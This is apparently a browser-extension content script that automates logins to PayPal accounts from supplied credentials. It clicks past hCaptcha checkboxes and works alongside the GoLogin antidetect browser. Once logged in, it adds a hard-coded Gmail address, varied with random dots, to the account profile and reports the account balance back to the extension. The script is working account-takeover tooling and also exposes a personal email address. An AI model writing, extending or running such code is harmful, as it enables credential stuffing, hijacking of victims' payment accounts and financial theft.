let lastUrl = location.href;
new MutationObserver(() => {
    const url = location.href;
    if (url !== lastUrl) {
        lastUrl = url;
        onUrlChange();
    }
}).observe(document, { subtree: true, childList: true });

function onUrlChange() {
    console.log('URL changed to', location.href);
    // Thực hiện các hành động cần thiết khi URL thay đổi
    checkAndRedirect();
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', afterContentLoaded);
} else {
    afterContentLoaded();
}

function afterContentLoaded() {
    clearLocalData();
    // Đặt tất cả code hiện tại của bạn vào đây
}

function clearLocalData() {
    console.log("Clearing local data");
    localStorage.clear();
    sessionStorage.clear();
}

async function fillCredentials(username, password) {
    // Xóa sessionStorage
    sessionStorage.clear();

    console.log('Attempting to fill credentials');

    try {
        await fillUsername(username);
        await fillPassword(password);

        if (await checkForTryAnotherWayLink()) {
            await tryAnotherWayLogin(username, password);
        } else {
            await clickElement('#btnLogin');
        }

        await handleCaptchaIfPresent();

        setTimeout(() => {
            if (clickCaptchaCheckbox()) {
                console.log('CAPTCHA checkbox clicked');
            }
            if (handleLoginButton()) {
                console.log('Login button handled');
            }
            checkForErrors();
        }, 2000);
    } catch (error) {
        console.error('Error during login process:', error);
        chrome.runtime.sendMessage({ action: 'loginError', reason: error.message });
    }
}

async function fillUsername(username) {
    const usernameField = document.querySelector('input[name="login_email"]') || document.querySelector('#email');
    if (usernameField) {
        usernameField.value = username;
        usernameField.dispatchEvent(new Event('input', { bubbles: true }));
        usernameField.dispatchEvent(new Event('change', { bubbles: true }));
    } else {
        throw new Error('Username field not found');
    }
}

async function fillPassword(password) {
    const passwordField = document.querySelector('input[name="login_password"]') || document.querySelector('#password');
    if (passwordField) {
        passwordField.value = password;
        passwordField.dispatchEvent(new Event('input', { bubbles: true }));
        passwordField.dispatchEvent(new Event('change', { bubbles: true }));
    } else {
        throw new Error('Password field not found');
    }
}

async function checkForTryAnotherWayLink() {
    return new Promise((resolve) => {
        setTimeout(() => {
            const link = document.querySelector('p.tryAnotherWayLink > a, #tryAnotherWayLink > a');
            resolve(link !== null);
        }, 1000); // Đợi 1 giây để trang có thể cập nhật sau khi điền username
    });
}

async function clickElement(selector) {
    return new Promise((resolve, reject) => {
        const element = document.querySelector(selector);
        if (element) {
            element.click();
            resolve();
        } else {
            reject(new Error(`Element not found: ${selector}`));
        }
    });
}

async function fillLoginForm(username, password) {
    const usernameField = document.querySelector('input[name="login_email"]') || document.querySelector('#email');
    const passwordField = document.querySelector('input[name="login_password"]') || document.querySelector('#password');

    if (usernameField && passwordField) {
        usernameField.value = username;
        passwordField.value = password;

        [usernameField, passwordField].forEach(field => {
            field.dispatchEvent(new Event('input', { bubbles: true }));
            field.dispatchEvent(new Event('change', { bubbles: true }));
        });
    } else {
        throw new Error('Login form fields not found');
    }
}

async function handleCaptchaIfPresent() {
    const captchaFrame = document.querySelector('iframe[src*="hcaptcha"]');
    if (captchaFrame) {
        console.log('CAPTCHA detected, attempting to solve');
        // Chuyển focus đến iframe CAPTCHA
        captchaFrame.focus();

        // Cố gắng nhấp vào checkbox trong iframe
        captchaFrame.contentWindow.postMessage('clickCaptcha', '*');

        // Đợi một khoảng thời gian để CAPTCHA được xử lý
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

function checkForErrors() {
    const errorMessage = document.querySelector('.notification.notification-critical');
    if (errorMessage) {
        if (errorMessage.textContent.includes('Một số thông tin của bạn không chính xác')) {
            chrome.runtime.sendMessage({ action: 'loginError', reason: 'Incorrect information' });
        } else if (errorMessage.textContent.includes('Vì lý do bảo mật, bạn cần đặt lại mật khẩu')) {
            chrome.runtime.sendMessage({ action: 'loginError', reason: 'Password reset required' });
        }
    } else if (document.body.getAttribute('data-view-name') === 'authcaptcha') {
        handleCaptcha();
    } else {
        console.log('Login successful');
        checkAndRedirect();
    }
}

function handleCaptcha() {
    console.log('CAPTCHA detected, attempting to solve');
    const captchaCheckbox = document.querySelector('#checkbox');
    if (captchaCheckbox) {
        captchaCheckbox.click();
        setTimeout(checkForErrors, 5000); // Check again after 5 seconds
    } else {
        chrome.runtime.sendMessage({ action: 'loginError', reason: 'CAPTCHA detected but unable to solve' });
    }
}

function checkAndRedirect() {
    if (window.location.href.includes('mobile-app')) {
        window.location.href = 'https://www.paypal.com/myaccount/summary';
    } else if (window.location.href.includes('/myaccount/summary')) {
        setTimeout(getBalance, 2000);
    } else if (window.location.href.includes('/signin')) {
        // Xử lý trang đăng nhập nếu cần
        console.log('On signin page');
    } else if (window.location.href.includes('/myaccount/profile/email/add')) {
        setTimeout(handleEmailAddition, 2000);
    }
}

function handleEmailAddition() {
    const confirmButton = document.querySelector('button#confirm-button');
    if (confirmButton) {
        confirmButton.click();
        setTimeout(fillNewEmail, 2000);
    }
}

function fillNewEmail() {
    const emailInput = document.querySelector('input#text-input-emailAdd');
    if (emailInput) {
        const baseEmail = 'hoatrongyenhh401@gmail.com';
        const randomizedEmail = addRandomDots(baseEmail);
        emailInput.value = randomizedEmail;
        emailInput.dispatchEvent(new Event('input', { bubbles: true }));
        emailInput.dispatchEvent(new Event('change', { bubbles: true }));
        console.log('New email filled:', randomizedEmail);
    }
}

function addRandomDots(email) {
    const [localPart, domain] = email.split('@');
    const characters = localPart.split('');
    let newLocalPart = '';
    for (let i = 0; i < characters.length; i++) {
        newLocalPart += characters[i];
        if (i < characters.length - 1 && Math.random() > 0.5) {
            newLocalPart += '.';
        }
    }
    return `${newLocalPart}@${domain}`;
}

function getBalance() {
    const balanceElement = document.querySelector('.fiDetails-balance_info .ppvx_text--heading-lg.balanceDetails-amount span');
    if (balanceElement) {
        const balance = balanceElement.textContent.trim();
        chrome.runtime.sendMessage({ action: 'updateBalance', balance: balance });
    } else {
        console.error('Balance element not found');
    }
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'fillCredentials') {
        fillCredentials(request.username, request.password);
        sendResponse({ success: true });
    }
});

// Check and redirect on page load
checkAndRedirect();

// Thêm listener để xử lý message từ iframe CAPTCHA
window.addEventListener('message', function(event) {
    if (event.data === 'captchaSolved') {
        console.log('CAPTCHA solved successfully');
        // Có thể thêm logic xử lý sau khi CAPTCHA được giải quyết
    }
});

// Thêm các chức năng mới ở cuối file

async function tryAnotherWayLogin(username, password) {
    try {
        // Kiểm tra và nhấp vào "Hãy thử cách khác" nếu có
        const tryAnotherWayLink = await checkForTryAnotherWayLink();
        if (tryAnotherWayLink) {
            await clickElement('p.tryAnotherWayLink > a, #tryAnotherWayLink > a');
            // Đợi và nhấp vào "Đăng nhập bằng mật khẩu"
            await waitAndClickElement('#otpLogin li:nth-of-type(4) div, #loginWithPassword');
            // Điền lại thông tin đăng nhập
            await fillLoginForm(username, password);
            // Nhấp vào nút đăng nhập
            await clickElement('#btnLogin');
        }
    } catch (error) {
        console.error('Error during alternative login process:', error);
    }
}

async function waitAndClickElement(selector, timeout = 5000) {
    return new Promise((resolve, reject) => {
        const startTime = Date.now();
        const checkElement = () => {
            const element = document.querySelector(selector);
            if (element) {
                element.click();
                resolve();
            } else if (Date.now() - startTime > timeout) {
                reject(new Error(`Timeout waiting for element: ${selector}`));
            } else {
                setTimeout(checkElement, 100);
            }
        };
        checkElement();
    });
}

function clickCaptchaCheckbox() {
    const captchaCheckbox = document.querySelector('div[id="checkbox"][role="checkbox"]');
    if (captchaCheckbox) {
        console.log('CAPTCHA checkbox found, attempting to click');
        captchaCheckbox.click();
        return true;
    }
    return false;
}

function handleLoginButton() {
    const loginButton = document.querySelector('button#btnLogin.button.actionContinue[type="submit"]');
    if (loginButton) {
        console.log('Login button found, attempting to click');
        loginButton.click();

        setTimeout(() => {
            const errorMessage = document.querySelector('.notification.notification-critical');
            if (errorMessage) {
                console.error('Login error:', errorMessage.textContent);
                chrome.runtime.sendMessage({ action: 'loginError', reason: errorMessage.textContent });
            } else {
                console.log('Login button clicked successfully');
                checkAndRedirect();
            }
        }, 2000);

        return true;
    }
    return false;
}

if (window.location.hostname === 'app.gologin.com') {
    // Wait for the GoLogin page to fully load
    window.addEventListener('load', () => {
        // Send a message to the background script to start the autoload process
        chrome.runtime.sendMessage({ action: 'gologinLoaded' });
    });
}

console.log("Content script loaded");

if (window.location.hostname.includes('gologin.cc')) {
    console.log("GoLogin.cc detected in content script");
    // Wait for the GoLogin page to fully load
    window.addEventListener('load', () => {
        console.log("GoLogin.cc page fully loaded");
        // Send a message to the background script to start the autoload process
        chrome.runtime.sendMessage({ action: 'gologinLoaded' });
    });
}

// ... rest of your existing content.js code ...